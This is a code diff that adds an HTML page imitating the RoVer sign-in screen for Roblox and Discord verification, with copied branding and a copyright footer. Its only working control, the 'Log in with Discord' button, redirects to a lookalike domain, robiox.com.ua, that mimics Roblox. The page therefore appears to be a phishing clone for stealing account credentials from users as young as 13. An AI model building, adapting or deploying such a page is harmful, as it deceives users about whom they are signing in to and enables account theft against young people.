@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoVer - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header Styles */
+        .header {
+            background-color: hsl(340, 75%, 65%);
+            padding: 12px 16px;
+        }
+
+        .header-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .mobile-menu {
+            display: block;
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .mobile-menu:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background-color: white;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-icon-inner {
+            width: 24px;
+            height: 24px;
+            border: 2px solid hsl(340, 75%, 65%);
+            border-radius: 2px;
+            position: relative;
+        }
+
+        .logo-icon-inner::after {
+            content: '';
+            position: absolute;
+            inset: 4px;
+            border: 1px solid hsl(340, 75%, 65%);
+            border-radius: 1px;
+        }
+
+        .logo-text {
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        .desktop-nav {
+            display: none;
+            align-items: center;
+            gap: 24px;
+            margin-left: 32px;
+        }
+
+        .nav-link {
+            color: white;
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+
+        .nav-link:hover {
+            opacity: 0.8;
+        }
+
+        .nav-badge {
+            color: rgba(255, 255, 255, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .desktop-actions {
+            display: none;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            transition: all 0.2s;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+        }
+
+        .btn-outline:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-secondary {
+            background-color: white;
+            color: hsl(340, 75%, 65%);
+        }
+
+        .btn-secondary:hover {
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+
+        .mobile-spacer {
+            width: 40px;
+        }
+
+        /* Main Content */
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+
+        .sign-in-card {
+            width: 100%;
+            max-width: 448px;
+            background-color: #000000;
+            border-radius: 8px;
+            padding: 32px;
+            border: 1px solid #333333;
+            text-align: center;
+        }
+
+        .sign-in-title {
+            font-size: 30px;
+            font-weight: bold;
+            margin-bottom: 24px;
+        }
+
+        .age-notice {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 24px;
+        }
+
+        .info-box {
+            background-color: #374151;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            display: flex;
+            gap: 12px;
+        }
+
+        .info-icon {
+            width: 20px;
+            height: 20px;
+            color: #60a5fa;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #d1d5db;
+        }
+
+        .info-text p {
+            margin-bottom: 4px;
+        }
+
+        .help-link {
+            color: hsl(340, 75%, 65%);
+            text-decoration: none;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: hsl(340, 75%, 65%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 9999px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: hsl(340, 75%, 60%);
+        }
+
+        /* Footer */
+        .footer {
+            padding: 32px 16px;
+        }
+
+        .footer-container {
+            max-width: 1152px;
+            margin: 0 auto;
+        }
+
+        .footer-links {
+            display: none;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 32px;
+            margin-bottom: 32px;
+        }
+
+        .footer-link {
+            display: block;
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 8px;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: white;
+        }
+
+        .footer-branding {
+            text-align: center;
+        }
+
+        .imaginary-logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+
+        .imaginary-text {
+            background: linear-gradient(to right, #ec4899, #fb923c);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .imaginary-menagerie {
+            font-style: italic;
+        }
+
+        .copyright {
+            color: #9ca3af;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .mobile-attribution {
+            display: block;
+        }
+
+        .attribution-link {
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .attribution-link:hover {
+            color: white;
+        }
+
+        /* Desktop Styles */
+        @media (min-width: 768px) {
+            .header {
+                padding: 12px 24px;
+            }
+
+            .mobile-menu {
+                display: none;
+            }
+
+            .desktop-nav {
+                display: flex;
+            }
+
+            .desktop-actions {
+                display: flex;
+            }
+
+            .mobile-spacer {
+                display: none;
+            }
+
+            .info-box {
+                display: none;
+            }
+
+            .footer-links {
+                display: grid;
+            }
+
+            .mobile-attribution {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <!-- Mobile hamburger menu -->
+            <button class="mobile-menu">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="4" x2="20" y1="6" y2="6"/>
+                    <line x1="4" x2="20" y1="12" y2="12"/>
+                    <line x1="4" x2="20" y1="18" y2="18"/>
+                </svg>
+            </button>
+
+            <!-- Logo -->
+            <div class="logo">
+                <div class="logo-icon">
+                    <div class="logo-icon-inner"></div>
+                </div>
+                <span class="logo-text">RoVer</span>
+            </div>
+
+            <!-- Desktop navigation -->
+            <nav class="desktop-nav">
+                <a href="#" class="nav-link">Help</a>
+                <a href="#" class="nav-link">Team Members</a>
+                <span class="nav-badge">RoVer Plus</span>
+            </nav>
+
+            <!-- Desktop action buttons -->
+            <div class="desktop-actions">
+                <a href="#" class="btn btn-outline">Manage Servers</a>
+                <a href="#" class="btn btn-secondary">Sign In</a>
+            </div>
+
+            <!-- Mobile spacer -->
+            <div class="mobile-spacer"></div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main">
+        <div class="sign-in-card">
+            <h1 class="sign-in-title">Sign in to RoVer</h1>
+            
+            <p class="age-notice">You must be 13 years of age or older to continue.</p>
+
+            <!-- Info box - only visible on mobile -->
+            <div class="info-box">
+                <svg class="info-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="m9 12 2 2 4-4"/>
+                </svg>
+                <div class="info-text">
+                    <p>If the next page says:</p>
+                    <p>
+                        <span style="color: #e5e7eb;">"You need to verify your account in order to perform this action"</span>, 
+                        please read <a href="#" class="help-link">this help article</a>.
+                    </p>
+                </div>
+            </div>
+
+            <button class="login-btn" onclick="window.location.href='https://www.robiox.com.ua/login?returnUrl=2043330919414639'">
+                Log in with Discord
+            </button>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <!-- Desktop footer links -->
+            <div class="footer-links">
+                <div>
+                    <a href="#" class="footer-link">Team members</a>
+                    <a href="#" class="footer-link">Support Discord server ↗</a>
+                    <a href="#" class="footer-link">Add RoVer to your server</a>
+                    <a href="#" class="footer-link">Bot Developer API</a>
+                </div>
+                <div>
+                    <a href="#" class="footer-link">Terms of Service</a>
+                    <a href="#" class="footer-link">Privacy Policy</a>
+                    <a href="#" class="footer-link">Verify your Roblox account</a>
+                </div>
+            </div>
+
+            <!-- Imaginary Menagerie branding -->
+            <div class="footer-branding">
+                <div class="imaginary-logo">
+                    <div class="imaginary-text">Imaginary</div>
+                    <div class="imaginary-text imaginary-menagerie">Menagerie</div>
+                </div>
+
+                <p class="copyright">© 2025 Imaginary Menagerie, LLC.</p>
+
+                <!-- Mobile attributions link -->
+                <div class="mobile-attribution">
+                    <a href="#" class="attribution-link">attributions</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
